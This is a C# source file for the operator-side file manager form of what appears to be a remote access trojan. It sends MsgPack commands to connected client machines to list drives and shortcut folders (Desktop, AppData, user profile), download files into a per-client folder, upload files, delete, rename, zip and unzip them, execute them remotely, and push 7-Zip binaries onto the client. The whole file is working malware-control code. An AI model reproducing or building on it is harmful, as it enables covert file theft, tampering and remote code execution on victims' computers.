using Server.MessagePack;
using Server.Connection;
using System;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using Microsoft.VisualBasic;
using System.Text;
using System.Drawing;
using System.Diagnostics;

namespace Server.Forms
{
    public partial class FormFileManager : Form
    {
        public Form1 F { get; set; }
        internal Clients Client { get; set; }
        public string FullPath { get; set; }
        public FormFileManager()
        {
            InitializeComponent();
        }
        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count == 1)
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
                    msgpack.ForcePathObject("Command").AsString = "getPath";
                    msgpack.ForcePathObject("Path").AsString = listView1.SelectedItems[0].ToolTipText;
                    listView1.Enabled = false;
                    toolStripStatusLabel3.ForeColor = Color.Green;
                    toolStripStatusLabel3.Text = "Please Wait";
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
            }
            catch
            {

            }
        }

        private void backToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                string path = toolStripStatusLabel1.Text;
                if (path.Length <= 3)
                {
                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
                    msgpack.ForcePathObject("Command").AsString = "getDrivers";
                    toolStripStatusLabel1.Text = "";
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                    return;
                }
                path = path.Remove(path.LastIndexOfAny(new char[] { '\\' }, path.LastIndexOf('\\')));
                msgpack.ForcePathObject("Packet").AsString = "fileManager";
                msgpack.ForcePathObject("Command").AsString = "getPath";
                msgpack.ForcePathObject("Path").AsString = path + "\\";
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            }
            catch
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "fileManager";
                msgpack.ForcePathObject("Command").AsString = "getDrivers";
                toolStripStatusLabel1.Text = "";
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                return;
            }

        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + Client.ID)))
                        Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder\\" + Client.ID));
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        if (itm.ImageIndex == 0 && itm.ImageIndex == 1 && itm.ImageIndex == 2) return;
                        MsgPack msgpack = new MsgPack();
                        string dwid = Guid.NewGuid().ToString();
                        msgpack.ForcePathObject("Packet").AsString = "fileManager";
                        msgpack.ForcePathObject("Command").AsString = "socketDownload";
                        msgpack.ForcePathObject("File").AsString = itm.ToolTipText;
                        msgpack.ForcePathObject("DWID").AsString = dwid;
                        ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                        this.BeginInvoke((MethodInvoker)(() =>
                        {
                            FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + dwid];
                            if (SD == null)
                            {
                                SD = new FormDownloadFile
                                {
                                    Name = "socketDownload:" + dwid,
                                    Text = "socketDownload:" + Client.ID,
                                    F = F,
                                    DirPath = FullPath

                                };
                                SD.Show();
                            }
                        }));
                    }
                }
            }
            catch { }
        }

        private void uPLOADToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (toolStripStatusLabel1.Text.Length >= 3)
                try
                {
                    OpenFileDialog O = new OpenFileDialog();
                    O.Multiselect = true;
                    if (O.ShowDialog() == DialogResult.OK)
                    {
                        foreach (string ofile in O.FileNames)
                        {
                            FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + ""];
                            if (SD == null)
                            {
                                SD = new FormDownloadFile
                                {
                                    Name = "socketUpload:" + Guid.NewGuid().ToString(),
                                    Text = "socketUpload:" + Client.ID,
                                    F = Program.form1,
                                    Client = Client
                                };
                                SD.FileSize = new FileInfo(ofile).Length;
                                SD.labelfile.Text = Path.GetFileName(ofile);
                                SD.FullFileName = ofile;
                                SD.label1.Text = "Upload:";
                                SD.ClientFullFileName = toolStripStatusLabel1.Text + "\\" + Path.GetFileName(ofile);
                                MsgPack msgpack = new MsgPack();
                                msgpack.ForcePathObject("Packet").AsString = "fileManager";
                                msgpack.ForcePathObject("Command").AsString = "reqUploadFile";
                                msgpack.ForcePathObject("ID").AsString = SD.Name;
                                SD.Show();
                                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                            }
                        }
                    }
                }
                catch { }
        }

        private void dELETEToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        if (itm.ImageIndex != 0 && itm.ImageIndex != 1 && itm.ImageIndex != 2)
                        {
                            MsgPack msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "fileManager";
                            msgpack.ForcePathObject("Command").AsString = "deleteFile";
                            msgpack.ForcePathObject("File").AsString = itm.ToolTipText;
                            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                        }
                        else if (itm.ImageIndex == 0)
                        {
                            MsgPack msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "fileManager";
                            msgpack.ForcePathObject("Command").AsString = "deleteFolder";
                            msgpack.ForcePathObject("Folder").AsString = itm.ToolTipText;
                            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                        }
                    }
                }
            }
            catch { }
        }

        private void rEFRESHToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (toolStripStatusLabel1.Text != "")
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
                    msgpack.ForcePathObject("Command").AsString = "getPath";
                    msgpack.ForcePathObject("Path").AsString = toolStripStatusLabel1.Text;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
                else
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
                    msgpack.ForcePathObject("Command").AsString = "getDrivers";
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                    return;
                }
            }
            catch { }
        }

        private void eXECUTEToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "fileManager";
                        msgpack.ForcePathObject("Command").AsString = "execute";
                        msgpack.ForcePathObject("File").AsString = itm.ToolTipText;
                        ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch
            {

            }
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!Client.TcpClient.Connected) this.Close();
            }
            catch { this.Close(); }
        }

        private void DESKTOPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "fileManager";
                msgpack.ForcePathObject("Command").AsString = "getPath";
                msgpack.ForcePathObject("Path").AsString = "DESKTOP";
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            }
            catch
            {

            }
        }

        private void APPDATAToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "fileManager";
                msgpack.ForcePathObject("Command").AsString = "getPath";
                msgpack.ForcePathObject("Path").AsString = "APPDATA";
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            }
            catch
            {

            }
        }

        private void CreateFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                string foldername = Interaction.InputBox("Create Folder", "Name", Path.GetRandomFileName().Replace(".", ""));
                if (string.IsNullOrEmpty(foldername))
                    return;
                else
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
                    msgpack.ForcePathObject("Command").AsString = "createFolder";
                    msgpack.ForcePathObject("Folder").AsString = Path.Combine(toolStripStatusLabel1.Text, foldername);
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
            }
            catch { }
        }

        private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    StringBuilder files = new StringBuilder();
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        files.Append(itm.ToolTipText + "-=>");
                    }
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
                    msgpack.ForcePathObject("Command").AsString = "copyFile";
                    msgpack.ForcePathObject("File").AsString = files.ToString();
                    msgpack.ForcePathObject("IO").AsString = "copy";
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
            }
            catch { }
        }

        private void PasteToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "fileManager";
                msgpack.ForcePathObject("Command").AsString = "pasteFile";
                msgpack.ForcePathObject("File").AsString = toolStripStatusLabel1.Text;
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            }
            catch { }
        }

        private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                try
                {
                    string filename = Interaction.InputBox("Rename File or Folder", "Name", listView1.SelectedItems[0].Text);
                    if (string.IsNullOrEmpty(filename))
                        return;
                    else
                    {
                        if (listView1.SelectedItems[0].ImageIndex != 0 && listView1.SelectedItems[0].ImageIndex != 1 && listView1.SelectedItems[0].ImageIndex != 2)
                        {
                            MsgPack msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "fileManager";
                            msgpack.ForcePathObject("Command").AsString = "renameFile";
                            msgpack.ForcePathObject("File").AsString = listView1.SelectedItems[0].ToolTipText;
                            msgpack.ForcePathObject("NewName").AsString = Path.Combine(toolStripStatusLabel1.Text, filename);
                            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                            return;
                        }
                        else if (listView1.SelectedItems[0].ImageIndex == 0)
                        {
                            MsgPack msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "fileManager";
                            msgpack.ForcePathObject("Command").AsString = "renameFolder";
                            msgpack.ForcePathObject("Folder").AsString = listView1.SelectedItems[0].ToolTipText + "\\";
                            msgpack.ForcePathObject("NewName").AsString = Path.Combine(toolStripStatusLabel1.Text, filename);
                            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                        }
                    }
                }
                catch { }
            }
        }

        private void UserProfileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "fileManager";
                msgpack.ForcePathObject("Command").AsString = "getPath";
                msgpack.ForcePathObject("Path").AsString = "USER";
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            }
            catch { }
        }

        private void DriversListsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "fileManager";
            msgpack.ForcePathObject("Command").AsString = "getDrivers";
            toolStripStatusLabel1.Text = "";
            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
        }

        private void OpenClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (!Directory.Exists(FullPath))
                    Directory.CreateDirectory(FullPath);
                Process.Start(FullPath);
            }
            catch { }
        }

        private void FormFileManager_FormClosed(object sender, FormClosedEventArgs e)
        {
            ThreadPool.QueueUserWorkItem((o) =>
            {
                Client?.Disconnected();
            });
        }

        private void CutToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    StringBuilder files = new StringBuilder();
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        files.Append(itm.ToolTipText + "-=>");
                    }
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
                    msgpack.ForcePathObject("Command").AsString = "copyFile";
                    msgpack.ForcePathObject("File").AsString = files.ToString();
                    msgpack.ForcePathObject("IO").AsString = "cut";
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
            }
            catch { }
        }

        private void ZipToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    StringBuilder files = new StringBuilder();
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        files.Append(itm.ToolTipText + "-=>");

                    }
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
                    msgpack.ForcePathObject("Command").AsString = "zip";
                    msgpack.ForcePathObject("Path").AsString = files.ToString();
                    msgpack.ForcePathObject("Zip").AsString = "true";
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
            }
            catch { }
        }

        private void UnzipToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "fileManager";
                        msgpack.ForcePathObject("Command").AsString = "zip";
                        msgpack.ForcePathObject("Path").AsString = itm.ToolTipText;
                        msgpack.ForcePathObject("Zip").AsString = "false";
                        ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch { }
        }

        private void InstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "fileManager";
            msgpack.ForcePathObject("Command").AsString = "installZip";
            msgpack.ForcePathObject("exe").SetAsBytes(Properties.Resources._7z);
            msgpack.ForcePathObject("dll").SetAsBytes(Properties.Resources._7z1);
            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
        }
    }
}